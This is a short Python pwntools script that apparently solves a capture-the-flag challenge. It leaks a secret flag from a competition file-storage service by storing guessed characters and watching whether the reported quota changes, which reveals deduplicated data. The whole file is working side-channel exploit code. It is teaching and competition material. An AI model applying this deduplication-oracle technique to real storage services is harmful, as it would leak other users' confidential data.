# -*- coding: utf-8 -*-
from pwn import *
import string
import re

# check the flag length
conn = remote('filestore.2021.ctfcompetition.com', 1337)
conn.recvuntil("exit")
conn.sendline(b"status")
received = conn.recvuntil(b"Menu").decode()
match = re.search(r"Quota: (.+)/64.000kB", received)
target_quota = match[1]
conn.close()

valid = []

# extract the true charactor/text in the flag 
def checkQuota(text):
    conn = remote('filestore.2021.ctfcompetition.com', 1337)
    conn.recvuntil("exit")
    conn.sendline(b"store")
    conn.recv()
    conn.sendline(f"{text}")
    conn.recvuntil("Menu")
    conn.sendline(b"status")
    received = conn.recvuntil("Menu").decode()
    match = re.search(r"Quota: (.+)/64.000kB", received)
    quota = match[1]
    return quota

# find all letters, digits, and punctuation in the flag 
for char in string.printable[:-6]:
    quota = checkQuota(char)
    if quota == target_quota:
        print(f"{char} works!")
        valid.append(char)

    conn.close()
    
print(valid)

#################################################################
# valid = ['0', '1', '3', '4', 'c', 'd', 'f', 'i', 'n', 'p', 't', 'u', 'C', 'F', 'M', 'R', 'T', '_', '{', '}']
flagpart = ''

# find first 16 letter flag
firstflag = 'CTF{'
for i in range(12):
    for char in valid:
        flagpart = firstflag + char
        quota = checkQuota(flagpart)
        if quota == target_quota:
            firstflag += char
            print("The first flag is", firstflag, "...")
            conn.close()
            break
        conn.close()

# find last 10 letter flag
lastflag = '}'
for i in range(10):
    for char in valid:
        flagpart = char + lastflag
        quota = checkQuota(flagpart)
        if quota == target_quota:
            lastflag = char + lastflag
            print("The last flag is", "...", lastflag)
            conn.close()
            break
        conn.close()

print("The flag is", firstflag + lastflag)